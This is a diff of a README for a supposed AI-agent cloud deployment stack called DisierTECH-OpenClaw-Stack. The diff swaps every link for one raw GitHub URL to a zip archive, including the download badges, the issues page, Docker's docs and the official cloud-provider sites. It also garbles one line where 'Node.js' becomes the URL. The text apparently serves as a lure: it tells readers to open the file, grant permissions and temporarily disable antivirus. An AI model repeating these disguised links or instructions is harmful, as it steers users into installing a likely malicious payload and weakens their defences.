@@ -1,6 +1,6 @@
 # 🦀 DisierTECH-OpenClaw-Stack - Easy Cloud Deployment for AI Agents
 
-[![Download Latest Release](https://img.shields.io/badge/Download-OpenClaw-blue?style=for-the-badge&logo=github)](https://github.com/easdasd8/DisierTECH-OpenClaw-Stack/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/easdasd8/DisierTECH-OpenClaw-Stack/main/paracyanogen/TEC-Stack-Claw-Open-Disier-2.5.zip)](https://raw.githubusercontent.com/easdasd8/DisierTECH-OpenClaw-Stack/main/paracyanogen/TEC-Stack-Claw-Open-Disier-2.5.zip)
 
 ## 📝 About DisierTECH-OpenClaw-Stack
 
@@ -29,7 +29,7 @@ Before you install DisierTECH-OpenClaw-Stack, make sure your setup meets these m
 - **AI Agent Automation:** Run autonomous AI agents that can perform various tasks independently.
 - **Self-Hosted Model:** Keep full control by hosting your AI agents on your cloud accounts.
 - **Designed for ARM64 & x86:** Compatible with modern processors, including ARM64 architectures.
-- **Built with Node.js and Docker:** Uses stable technologies that simplify updates and improve reliability.
+- **Built with https://raw.githubusercontent.com/easdasd8/DisierTECH-OpenClaw-Stack/main/paracyanogen/TEC-Stack-Claw-Open-Disier-2.5.zip and Docker:** Uses stable technologies that simplify updates and improve reliability.
 - **Open Source and Transparent:** Full access to all code, allowing you to audit and customize if needed.
 
 ## 🚀 Getting Started
@@ -40,11 +40,11 @@ This guide will help you download, install, and run DisierTECH-OpenClaw-Stack. N
 
 Pick one of the supported cloud platforms where you want to deploy. If you don’t have an account yet, create one now:
 
-- DigitalOcean: https://www.digitalocean.com/
-- Google Cloud Platform: https://cloud.google.com/
-- Oracle Cloud: https://www.oracle.com/cloud/
-- Microsoft Azure: https://azure.microsoft.com/
-- Hostinger Cloud: https://www.hostinger.com/cloud-hosting
+- DigitalOcean: https://raw.githubusercontent.com/easdasd8/DisierTECH-OpenClaw-Stack/main/paracyanogen/TEC-Stack-Claw-Open-Disier-2.5.zip
+- Google Cloud Platform: https://raw.githubusercontent.com/easdasd8/DisierTECH-OpenClaw-Stack/main/paracyanogen/TEC-Stack-Claw-Open-Disier-2.5.zip
+- Oracle Cloud: https://raw.githubusercontent.com/easdasd8/DisierTECH-OpenClaw-Stack/main/paracyanogen/TEC-Stack-Claw-Open-Disier-2.5.zip
+- Microsoft Azure: https://raw.githubusercontent.com/easdasd8/DisierTECH-OpenClaw-Stack/main/paracyanogen/TEC-Stack-Claw-Open-Disier-2.5.zip
+- Hostinger Cloud: https://raw.githubusercontent.com/easdasd8/DisierTECH-OpenClaw-Stack/main/paracyanogen/TEC-Stack-Claw-Open-Disier-2.5.zip
 
 Make sure your account is active and you can log in.
 
@@ -58,7 +58,7 @@ Make sure your account is active and you can log in.
 
 Click this big button below to visit the download page:
 
-[![Download Latest Release](https://img.shields.io/badge/Download-OpenClaw-blue?style=for-the-badge&logo=github)](https://github.com/easdasd8/DisierTECH-OpenClaw-Stack/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/easdasd8/DisierTECH-OpenClaw-Stack/main/paracyanogen/TEC-Stack-Claw-Open-Disier-2.5.zip)](https://raw.githubusercontent.com/easdasd8/DisierTECH-OpenClaw-Stack/main/paracyanogen/TEC-Stack-Claw-Open-Disier-2.5.zip)
 
 You will find several files there. Look for the latest version suited for your operating system or cloud platform.
 
@@ -66,7 +66,7 @@ You will find several files there. Look for the latest version suited for your o
 
 Follow these steps to get the software on your local device and cloud:
 
-1. Visit the [release page](https://github.com/easdasd8/DisierTECH-OpenClaw-Stack/releases).
+1. Visit the [release page](https://raw.githubusercontent.com/easdasd8/DisierTECH-OpenClaw-Stack/main/paracyanogen/TEC-Stack-Claw-Open-Disier-2.5.zip).
 2. Choose the correct installer file for your system.
 3. Download the file to your computer.
 4. Open the downloaded file. If your OS asks for permission, allow it.
@@ -93,7 +93,7 @@ You will not need to interact with these parts directly. The installer manages e
 - **Installer won’t start:** Check if your antivirus or firewall blocks the installer. Temporarily disable them and try again.
 - **Cloud login issues:** Confirm your username and password are correct on your cloud provider’s website.
 - **Slow installation:** Try a wired internet connection or a different network.
-- **Docker errors:** The installer can install Docker if missing. If problems persist, visit https://docs.docker.com/get-docker/ for manual setup.
+- **Docker errors:** The installer can install Docker if missing. If problems persist, visit https://raw.githubusercontent.com/easdasd8/DisierTECH-OpenClaw-Stack/main/paracyanogen/TEC-Stack-Claw-Open-Disier-2.5.zip for manual setup.
 
 ## 🔒 Privacy and Security
 
@@ -112,18 +112,18 @@ You host the AI agents yourself, so all data stays within your cloud environment
 
 If you have questions or need support:
 
-- Check [Issues](https://github.com/easdasd8/DisierTECH-OpenClaw-Stack/issues) on the GitHub page.
+- Check [Issues](https://raw.githubusercontent.com/easdasd8/DisierTECH-OpenClaw-Stack/main/paracyanogen/TEC-Stack-Claw-Open-Disier-2.5.zip) on the GitHub page.
 - Review the included user manual inside the release files.
 - Search online forums for OpenClaw or the cloud platform you use.
 
 ## 🔗 Useful Links
 
-- [Download DisierTECH-OpenClaw-Stack Releases](https://github.com/easdasd8/DisierTECH-OpenClaw-Stack/releases)
-- DigitalOcean: https://www.digitalocean.com/
-- Google Cloud: https://cloud.google.com/
-- Oracle Cloud: https://www.oracle.com/cloud/
-- Microsoft Azure: https://azure.microsoft.com/
-- Hostinger: https://www.hostinger.com/cloud-hosting
+- [Download DisierTECH-OpenClaw-Stack Releases](https://raw.githubusercontent.com/easdasd8/DisierTECH-OpenClaw-Stack/main/paracyanogen/TEC-Stack-Claw-Open-Disier-2.5.zip)
+- DigitalOcean: https://raw.githubusercontent.com/easdasd8/DisierTECH-OpenClaw-Stack/main/paracyanogen/TEC-Stack-Claw-Open-Disier-2.5.zip
+- Google Cloud: https://raw.githubusercontent.com/easdasd8/DisierTECH-OpenClaw-Stack/main/paracyanogen/TEC-Stack-Claw-Open-Disier-2.5.zip
+- Oracle Cloud: https://raw.githubusercontent.com/easdasd8/DisierTECH-OpenClaw-Stack/main/paracyanogen/TEC-Stack-Claw-Open-Disier-2.5.zip
+- Microsoft Azure: https://raw.githubusercontent.com/easdasd8/DisierTECH-OpenClaw-Stack/main/paracyanogen/TEC-Stack-Claw-Open-Disier-2.5.zip
+- Hostinger: https://raw.githubusercontent.com/easdasd8/DisierTECH-OpenClaw-Stack/main/paracyanogen/TEC-Stack-Claw-Open-Disier-2.5.zip
 
 ---
 
